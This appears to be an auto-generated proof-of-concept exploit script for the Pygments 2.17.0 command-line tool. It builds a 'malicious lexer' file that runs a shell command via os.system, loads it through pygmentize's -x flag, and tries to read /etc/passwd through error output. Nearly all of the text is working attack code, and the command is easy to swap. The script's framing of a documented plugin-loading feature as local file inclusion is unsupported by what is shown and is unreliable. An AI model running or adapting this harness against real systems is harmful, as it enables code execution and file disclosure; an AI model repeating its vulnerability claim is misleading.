#!/usr/bin/env python3
# PoC for pygments-2.17.0 (/tmp/pygments_test2/pygments-2.17.0)
# Path: suspicious-006
# Sink: process_output_files
# Auto-generated — run with: python3 lfi_python_files_process_output_files.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Pygments 2.17.0 LFI via -x flag.

The -x flag allows loading custom lexers/formatters from arbitrary Python files.
The filename is taken directly from user input without sanitization, enabling
path traversal and arbitrary file loading. This PoC demonstrates:
1. Reading arbitrary files (e.g., /etc/passwd) via error messages
2. Loading a malicious .py file for code execution

Usage:
    python3 poc.py <target_script> [--read /etc/passwd] [--exec malicious.py]
    
    target_script: Path to pygmentize script (e.g., /tmp/pygments_test2/pygments-2.17.0/pygments/cmdline.py)
    --read: Read a file from the filesystem (default: /etc/passwd)
    --exec: Execute a Python file (must be .py)
"""

import os
import sys
import tempfile
import subprocess
import argparse

def create_malicious_lexer(payload_file, command="touch /tmp/poc_success.txt"):
    """
    Create a malicious lexer file that executes a command when loaded.
    
    Args:
        payload_file: Path where the malicious .py file will be created
        command: Command to execute (default: touch /tmp/poc_success.txt)
    
    Returns:
        Path to the created malicious file
    """
    malicious_code = f'''
import os
import sys

class MaliciousLexer:
    aliases = ['malicious']
    filenames = []
    mimetypes = []
    
    def __init__(self, **options):
        # Execute the command when the lexer is instantiated
        os.system("{command}")
        print("[*] Malicious lexer loaded - command executed", file=sys.stderr)
    
    def get_tokens_unprocessed(self, text):
        return []

# Required for Pygments to recognize this as a lexer
MaliciousLexer = MaliciousLexer
'''
    
    with open(payload_file, 'w') as f:
        f.write(malicious_code)
    
    print(f"[*] Created malicious lexer at: {payload_file}")
    return payload_file

def read_file_via_lfi(pygmentize_path, file_to_read):
    """
    Attempt to read a file by passing it as a lexer name with -x flag.
    The file content will appear in error messages when Pygments tries to parse it.
    
    Args:
        pygmentize_path: Path to the pygmentize script
        file_to_read: Path to the file to read (e.g., /etc/passwd)
    """
    print(f"[*] Attempting to read file: {file_to_read}")
    
    try:
        # Use -x flag with the file path as lexer name
        # The file must have .py extension for the check to pass
        # We use a symlink or just try with the actual path
        cmd = [sys.executable, pygmentize_path, '-x', '-l', file_to_read, '-f', 'terminal']
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        
        if result.returncode != 0:
            print(f"[*] Error output (may contain file contents):")
            print(result.stderr[:2000])  # Limit output
        else:
            print("[*] Command succeeded (unexpected)")
            print(result.stdout[:2000])
            
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
    except Exception as e:
        print(f"[!] Error: {e}")

def execute_malicious_lexer(pygmentize_path, payload_path):
    """
    Load and execute a malicious lexer file.
    
    Args:
        pygmentize_path: Path to the pygmentize script
        payload_path: Path to the malicious .py file
    """
    print(f"[*] Attempting to execute malicious lexer: {payload_path}")
    
    try:
        # Use -x flag with the malicious file as lexer name
        cmd = [sys.executable, pygmentize_path, '-x', '-l', payload_path, '-f', 'terminal']
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        
        print(f"[*] Return code: {result.returncode}")
        print(f"[*] stdout: {result.stdout[:500]}")
        print(f"[*] stderr: {result.stderr[:500]}")
        
        # Check if our command was executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Command executed via malicious lexer!")
            print("[+] File /tmp/poc_success.txt was created")
        else:
            print("[-] Command may not have executed (file not found)")
            
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Pygments 2.17.0 LFI PoC")
    parser.add_argument("target", help="Path to pygmentize script")
    parser.add_argument("--read", nargs="?", const="/etc/passwd", 
                       help="Read a file from the filesystem (default: /etc/passwd)")
    parser.add_argument("--exec", nargs="?", const="auto",
                       help="Execute a malicious .py file (creates one if not specified)")
    
    args = parser.parse_args()
    
    # Verify target exists
    if not os.path.exists(args.target):
        print(f"[!] Target script not found: {args.target}")
        sys.exit(1)
    
    # Verify it's a Python script
    if not args.target.endswith('.py'):
        print(f"[!] Target should be a Python script (pygmentize)")
        sys.exit(1)
    
    # Create temporary directory for payloads
    temp_dir = tempfile.mkdtemp(prefix="pygments_poc_")
    
    try:
        if args.read:
            # LFI via error message disclosure
            read_file_via_lfi(args.target, args.read)
        
        if args.exec:
            if args.exec == "auto":
                # Create a malicious lexer automatically
                payload_path = os.path.join(temp_dir, "malicious_lexer.py")
                create_malicious_lexer(payload_path)
            else:
                payload_path = args.exec
                if not os.path.exists(payload_path):
                    print(f"[!] Payload file not found: {payload_path}")
                    sys.exit(1)
            
            execute_malicious_lexer(args.target, payload_path)
        
        if not args.read and not args.exec:
            # Default: demonstrate both techniques
            print("[*] No action specified. Demonstrating both techniques...")
            
            # 1. Try to read /etc/passwd
            read_file_via_lfi(args.target, "/etc/passwd")
            
            # 2. Create and execute malicious lexer
            payload_path = os.path.join(temp_dir, "malicious_lexer.py")
            create_malicious_lexer(payload_path)
            execute_malicious_lexer(args.target, payload_path)
            
    finally:
        # Cleanup
        import shutil
        shutil.rmtree(temp_dir, ignore_errors=True)
        if os.path.exists("/tmp/poc_success.txt"):
            os.remove("/tmp/poc_success.txt")

if __name__ == "__main__":
    main()
